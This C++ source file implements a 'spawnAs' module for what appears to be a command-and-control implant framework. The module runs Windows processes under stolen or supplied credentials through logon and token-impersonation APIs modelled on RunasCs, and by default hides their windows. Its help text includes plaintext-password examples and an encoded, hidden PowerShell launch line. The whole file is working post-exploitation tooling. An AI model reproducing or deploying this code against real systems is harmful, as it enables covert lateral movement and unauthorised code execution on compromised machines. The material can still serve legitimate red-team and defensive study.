#include "SpawnAs.hpp"

#include <cstring>
#include <algorithm>
#include <exception>
#include <optional>
#include <sstream>
#include <string>
#include <vector>

#include "Tools.hpp"
#include "Common.hpp"

#ifdef __linux__

#elif _WIN32
#include <windows.h>
#include <stdio.h>
#include <userenv.h>
#include <string>
#endif

using namespace std;

#ifdef __linux__

#elif _WIN32

namespace
{
    std::string formatWindowsError(const std::string &apiName)
    {
        DWORD errorMessageID = ::GetLastError();
        std::ostringstream stream;
        stream << "Unable to " << apiName;
        if (errorMessageID != 0)
        {
            LPSTR messageBuffer = nullptr;
            const DWORD size = FormatMessageA(
                FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                nullptr,
                errorMessageID,
                MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                reinterpret_cast<LPSTR>(&messageBuffer),
                0,
                nullptr);
            if (size != 0 && messageBuffer != nullptr)
            {
                stream << " (0x" << std::hex << errorMessageID << std::dec << ")\n";
                stream.write(messageBuffer, size);
                LocalFree(messageBuffer);
            }
            else
            {
                stream << " (0x" << std::hex << errorMessageID << std::dec << ")\n";
            }
        }
        stream << "\n";
        return stream.str();
    }

    bool enablePrivilege(const wchar_t *privilegeName)
    {
        HANDLE processToken = nullptr;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &processToken))
        {
            return false;
        }

        LUID luid;
        if (!LookupPrivilegeValueW(nullptr, privilegeName, &luid))
        {
            CloseHandle(processToken);
            return false;
        }

        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if (!AdjustTokenPrivileges(processToken, FALSE, &tp, sizeof(tp), nullptr, nullptr))
        {
            CloseHandle(processToken);
            return false;
        }

        CloseHandle(processToken);

        return GetLastError() != ERROR_NOT_ALL_ASSIGNED;
    }

    bool duplicatePrimaryToken(HANDLE logonToken, HANDLE &primaryToken)
    {
        SECURITY_ATTRIBUTES securityAttributes;
        securityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
        securityAttributes.bInheritHandle = FALSE;
        securityAttributes.lpSecurityDescriptor = nullptr;

        if (!DuplicateTokenEx(
                logonToken,
                TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID,
                &securityAttributes,
                SecurityImpersonation,
                TokenPrimary,
                &primaryToken))
        {
            return false;
        }

        return true;
    }
}

#endif

constexpr std::string_view moduleName = "spawnAs";
constexpr unsigned long long moduleHash = djb2(moduleName);


#ifdef _WIN32

__declspec(dllexport) SpawnAs* A_SpawnAsConstructor() 
{
    return new SpawnAs();
}

#else

__attribute__((visibility("default"))) SpawnAs* SpawnAsConstructor() 
{
    return new SpawnAs();
}

#endif

SpawnAs::SpawnAs()
#ifdef BUILD_TEAMSERVER
    : ModuleCmd(std::string(moduleName), moduleHash)
#else
    : ModuleCmd("", moduleHash)
#endif
{
}

SpawnAs::~SpawnAs()
{
}

std::string SpawnAs::getInfo()
{
    std::string info;
#ifdef BUILD_TEAMSERVER
    info += "spawnAs:\n";
    info += "Launch a new process as another user, with the given credentials. \n";
    info += "Options:\n";
    info += "  -d, --domain <value>        Override the domain portion of the username.\n";
    info += "  -l, --logon-type <value>    Specify the LogonUser logon type (default 2). Allowed: 2,9.\n";
    info += "      --netonly               Shortcut for logon type 9 (LOGON32_LOGON_NEW_CREDENTIALS).\n";
    info += "  -p, --with-profile          Load the user profile before launching the process (default).\n";
    info += "      --no-profile            Do not load the profile.\n";
    info += "  -w, --show-window           Do not start the process hidden.\n";
    info += "Use -- to separate options from the command to execute.\n";
    info += "Examples:\n";
    info += "- spawnAs contoso\\alice P@ssw0rd -- powershell.exe -nop -w hidden -e SQBFAFgAIAAoACgA...\n";
    info += "- spawnAs -d . -l 9 bob Password123 -- cmd.exe /c whoami\n";
#endif
    return info;
}

std::string SpawnAs::packParameters(const Options& options) const
{
    std::string packed;
    auto append = [&packed](const std::string& value)
    {
        packed.append(value);
        packed.push_back('\0');
    };

    append(std::to_string(options.logonType));
    append(options.loadProfile ? "1" : "0");
    append(options.showWindow ? "1" : "0");
    return packed;
}

SpawnAs::Options SpawnAs::unpackParameters(const std::string& data) const
{
    Options options;

    if (data.empty())
    {
        return options;
    }

    std::vector<std::string> parts;
    size_t start = 0;
    while (start < data.size())
    {
        size_t end = data.find('\0', start);
        if (end == std::string::npos)
        {
            break;
        }
        parts.emplace_back(data.substr(start, end - start));
        start = end + 1;
    }

    if (parts.size() >= 1)
    {
        try
        {
            options.logonType = std::stoi(parts[0]);
        }
        catch (const std::exception &)
        {
            options.logonType = LOGON32_LOGON_INTERACTIVE;
        }
    }

    if (parts.size() >= 2)
    {
        options.loadProfile = parts[1] == "1";
    }

    if (parts.size() >= 3)
    {
        options.showWindow = parts[2] == "1";
    }

    return options;
}

int SpawnAs::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
{
    auto regroupedCmd = regroupStrings(splitedCmd);

    if (regroupedCmd.size() < 4)
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }

    std::string moduleInstruction = regroupedCmd[0];
    std::string domain = ".";
    std::optional<std::string> explicitDomain;
    Options options;

    std::vector<std::string> positionals;

    size_t idx = 1;
    while (idx < regroupedCmd.size())
    {
        const std::string &token = regroupedCmd[idx];

        if (token == "-d" || token == "--domain")
        {
            if (++idx >= regroupedCmd.size())
            {
                c2Message.set_returnvalue("Missing value for --domain option.\n");
                return -1;
            }
            explicitDomain = regroupedCmd[idx];
        }
        else if (token == "-l" || token == "--logon-type")
        {
            if (++idx >= regroupedCmd.size())
            {
                c2Message.set_returnvalue("Missing value for --logon-type option.\n");
                return -1;
            }
            try
            {
                options.logonType = std::stoi(regroupedCmd[idx]);
            }
            catch (const std::exception &)
            {
                c2Message.set_returnvalue("Invalid value for --logon-type option.\n");
                return -1;
            }
        }
        else if (token == "-p" || token == "--with-profile")
        {
            options.loadProfile = true;
        }
        else if (token == "--no-profile")
        {
            options.loadProfile = false;
        }
        else if (token == "-w" || token == "--show-window")
        {
            options.showWindow = true;
        }
        else if (token == "--netonly" || token == "--net-only" || token == "/netonly")
        {
            options.logonType = LOGON32_LOGON_NEW_CREDENTIALS;
        }
        else if (token == "--")
        {
            ++idx;
            while (idx < regroupedCmd.size())
            {
                positionals.push_back(regroupedCmd[idx++]);
            }
            break;
        }
        else
        {
            positionals.push_back(token);
        }
        ++idx;
    }

    if (positionals.size() < 3)
    {
        c2Message.set_returnvalue(getInfo());
        return -1;
    }

    std::string usernameInput = positionals[0];
    std::string password = positionals[1];
    std::string programToLaunch;
    for (size_t commandIdx = 2; commandIdx < positionals.size(); ++commandIdx)
    {
        if (!programToLaunch.empty())
        {
            programToLaunch += " ";
        }
        programToLaunch += positionals[commandIdx];
    }

    if (programToLaunch.empty())
    {
        c2Message.set_returnvalue("Missing command to execute.\n");
        return -1;
    }

    const std::vector<int> allowedLogonTypes = {
        LOGON32_LOGON_INTERACTIVE,
        LOGON32_LOGON_NEW_CREDENTIALS};

    if (std::find(allowedLogonTypes.begin(), allowedLogonTypes.end(), options.logonType) == allowedLogonTypes.end())
    {
        c2Message.set_returnvalue("Unsupported logon type provided.\n");
        return -1;
    }

    std::string username = usernameInput;

    if (explicitDomain.has_value())
    {
        domain = *explicitDomain;
        auto backslashPos = usernameInput.find('\\');
        auto atPos = usernameInput.find('@');
        if (backslashPos != std::string::npos)
        {
            username = usernameInput.substr(backslashPos + 1);
        }
        else if (atPos != std::string::npos)
        {
            username = usernameInput.substr(0, atPos);
        }
    }
    else
    {
        auto backslashPos = usernameInput.find('\\');
        auto atPos = usernameInput.find('@');
        if (backslashPos != std::string::npos)
        {
            domain = usernameInput.substr(0, backslashPos);
            username = usernameInput.substr(backslashPos + 1);
        }
        else if (atPos != std::string::npos)
        {
            username = usernameInput.substr(0, atPos);
            domain = usernameInput.substr(atPos + 1);
        }
    }

    if (domain.empty())
    {
        domain = ".";
    }

    std::string cmd = domain;
    cmd += '\0';
    cmd += username;
    cmd += '\0';
    cmd += password;

    c2Message.set_instruction(moduleInstruction);
    c2Message.set_cmd(cmd);
    c2Message.set_data(programToLaunch.data(), static_cast<int>(programToLaunch.size()));
    c2Message.set_args(packParameters(options));

    return 0;
}


int SpawnAs::process(C2Message &c2Message, C2Message &c2RetMessage)
{
    std::string cmd = c2Message.cmd();
    const std::string payload = c2Message.data();

    std::vector<std::string> splitedList;
    std::string delimitator;
    delimitator += '\0';
    splitList(cmd, delimitator, splitedList);

    if (splitedList.size() < 3)
    {
        c2RetMessage.set_returnvalue("Invalid command parameters received.\n");
        return -1;
    }

    std::string domain = splitedList[0];
    std::string username = splitedList[1];
    std::string password = splitedList[2];

    Options options = unpackParameters(c2Message.args());

    std::string result;

#ifdef __linux__

    result += "SpawnAs don't work in linux.\n";

#elif _WIN32

    std::wstring usernameW(username.begin(), username.end());
    std::wstring domainW(domain.begin(), domain.end());
    std::wstring passwordW(password.begin(), password.end());
    std::wstring commandLineW(payload.begin(), payload.end());

    if (commandLineW.empty())
    {
        c2RetMessage.set_returnvalue("Missing command to execute.\n");
        return -1;
    }

    std::vector<wchar_t> mutableCommand(commandLineW.begin(), commandLineW.end());
    mutableCommand.push_back(L'\0');

    PROCESS_INFORMATION piProcInfo;
    ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
    STARTUPINFOW si;
    ZeroMemory(&si, sizeof(STARTUPINFOW));
    si.cb = sizeof(STARTUPINFOW);

    if (options.showWindow)
    {
        si.dwFlags |= STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_SHOW;
    }

    const DWORD creationFlags = options.showWindow ? 0 : CREATE_NO_WINDOW;

    enum class SpawnStrategy
    {
        UseCreateProcessWithLogonW,
        UseCreateProcessWithTokenW,
        UseCreateProcessAsUserW
    };

    SpawnStrategy strategy = SpawnStrategy::UseCreateProcessWithLogonW;

    if (options.logonType == LOGON32_LOGON_NEW_CREDENTIALS)
    {
        // LOGON32_LOGON_NEW_CREDENTIALS can only be honoured through CreateProcessWithLogonW (RunasCs function 2).
        strategy = SpawnStrategy::UseCreateProcessWithLogonW;
    }
    else if (options.loadProfile)
    {
        // When a full user profile is requested we follow RunasCs function 0 and switch to CreateProcessAsUserW.
        strategy = SpawnStrategy::UseCreateProcessAsUserW;
    }
    else
    {
        // Lightweight interactive logons without profile loading leverage CreateProcessWithTokenW (RunasCs function 1).
        strategy = SpawnStrategy::UseCreateProcessWithTokenW;
    }

    const DWORD logonFlags = options.loadProfile ? LOGON_WITH_PROFILE : 0;

    std::string errorMessage;

    const auto getDomainPtr = [&]() -> LPCWSTR
    {
        return domainW.empty() ? nullptr : domainW.c_str();
    };

    const auto logonProvider = (options.logonType == LOGON32_LOGON_NEW_CREDENTIALS) ? LOGON32_PROVIDER_WINNT50 : LOGON32_PROVIDER_DEFAULT;

    const auto launchWithLogonW = [&]() -> bool
    {
        // This matches RunasCs' CreateProcessWithLogonW path for /netonly and default runas behaviour.
        DWORD effectiveFlags = logonFlags;
        if (options.logonType == LOGON32_LOGON_NEW_CREDENTIALS)
        {
            effectiveFlags |= LOGON_NETCREDENTIALS_ONLY;
        }

        if (!CreateProcessWithLogonW(
                usernameW.c_str(),
                getDomainPtr(),
                passwordW.c_str(),
                effectiveFlags,
                nullptr,
                mutableCommand.data(),
                creationFlags,
                nullptr,
                nullptr,
                &si,
                &piProcInfo))
        {
            errorMessage = formatWindowsError("CreateProcessWithLogonW");
            return false;
        }
        return true;
    };

    const auto launchWithTokenW = [&]() -> bool
    {
        // This reflects the RunasCs CreateProcessWithTokenW branch for lightweight impersonation.
        HANDLE logonToken = nullptr;
        if (!LogonUserW(usernameW.c_str(), getDomainPtr(), passwordW.c_str(), options.logonType, logonProvider, &logonToken))
        {
            errorMessage = formatWindowsError("LogonUserW");
            return false;
        }

        HANDLE primaryToken = nullptr;
        if (!duplicatePrimaryToken(logonToken, primaryToken))
        {
            errorMessage = formatWindowsError("DuplicateTokenEx");
            CloseHandle(logonToken);
            return false;
        }

        enablePrivilege(L"SeImpersonatePrivilege");

        bool created = CreateProcessWithTokenW(
            primaryToken,
            0,
            nullptr,
            mutableCommand.data(),
            creationFlags,
            nullptr,
            nullptr,
            &si,
            &piProcInfo);

        if (!created)
        {
            errorMessage = formatWindowsError("CreateProcessWithTokenW");
        }

        CloseHandle(primaryToken);
        CloseHandle(logonToken);

        return created;
    };

    const auto launchAsUserW = [&]() -> bool
    {
        // This mirrors RunasCs' CreateProcessAsUserW path for profile-aware interactive logons.
        HANDLE logonToken = nullptr;
        if (!LogonUserW(usernameW.c_str(), getDomainPtr(), passwordW.c_str(), options.logonType, logonProvider, &logonToken))
        {
            errorMessage = formatWindowsError("LogonUserW");
            return false;
        }

        HANDLE primaryToken = nullptr;
        if (!duplicatePrimaryToken(logonToken, primaryToken))
        {
            errorMessage = formatWindowsError("DuplicateTokenEx");
            CloseHandle(logonToken);
            return false;
        }

        enablePrivilege(L"SeAssignPrimaryTokenPrivilege");
        enablePrivilege(L"SeIncreaseQuotaPrivilege");
        enablePrivilege(L"SeImpersonatePrivilege");

        PROFILEINFO profileInfo;
        ZeroMemory(&profileInfo, sizeof(profileInfo));
        profileInfo.dwSize = sizeof(profileInfo);

        std::vector<wchar_t> profileUser(usernameW.begin(), usernameW.end());
        profileUser.push_back(L'\0');
        profileInfo.lpUserName = profileUser.data();

        bool profileLoaded = false;
        if (options.loadProfile)
        {
            if (!LoadUserProfileW(primaryToken, &profileInfo))
            {
                errorMessage = formatWindowsError("LoadUserProfileW");
                CloseHandle(primaryToken);
                CloseHandle(logonToken);
                return false;
            }
            profileLoaded = true;
        }

        LPVOID environmentBlock = nullptr;
        if (!CreateEnvironmentBlock(&environmentBlock, primaryToken, FALSE))
        {
            errorMessage = formatWindowsError("CreateEnvironmentBlock");
            if (profileLoaded)
            {
                UnloadUserProfile(primaryToken, profileInfo.hProfile);
            }
            CloseHandle(primaryToken);
            CloseHandle(logonToken);
            return false;
        }

        DWORD userCreationFlags = creationFlags | CREATE_UNICODE_ENVIRONMENT;

        bool created = CreateProcessAsUserW(
            primaryToken,
            nullptr,
            mutableCommand.data(),
            nullptr,
            nullptr,
            FALSE,
            userCreationFlags,
            environmentBlock,
            nullptr,
            &si,
            &piProcInfo);

        if (!created)
        {
            errorMessage = formatWindowsError("CreateProcessAsUserW");
        }

        if (environmentBlock != nullptr)
        {
            DestroyEnvironmentBlock(environmentBlock);
        }

        if (profileLoaded && profileInfo.hProfile != nullptr)
        {
            UnloadUserProfile(primaryToken, profileInfo.hProfile);
        }

        CloseHandle(primaryToken);
        CloseHandle(logonToken);

        return created;
    };

    bool created = false;
    switch (strategy)
    {
    case SpawnStrategy::UseCreateProcessWithLogonW:
        created = launchWithLogonW();
        break;
    case SpawnStrategy::UseCreateProcessWithTokenW:
        created = launchWithTokenW();
        break;
    case SpawnStrategy::UseCreateProcessAsUserW:
        created = launchAsUserW();
        break;
    }

    if (!created)
    {
        result += errorMessage;
        cmd += " ";
        cmd += payload;
        c2RetMessage.set_instruction(c2RetMessage.instruction());
        c2RetMessage.set_cmd(cmd);
        c2RetMessage.set_returnvalue(result);
        return 0;
    }

    CloseHandle(piProcInfo.hProcess);
    CloseHandle(piProcInfo.hThread);

#endif

    result += "Success.\n";

    c2RetMessage.set_instruction(c2RetMessage.instruction());
    cmd += " ";
    cmd += payload;
    c2RetMessage.set_cmd(cmd);
    c2RetMessage.set_returnvalue(result);
    return 0;
}

int SpawnAs::errorCodeToMsg(const C2Message &c2RetMessage, std::string &errorMsg)
{
#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) || defined(C2CORE_BUILD_TESTS)
    if (c2RetMessage.errorCode() > 0)
    {
        errorMsg = c2RetMessage.returnvalue();
    }
#endif
    return 0;
}

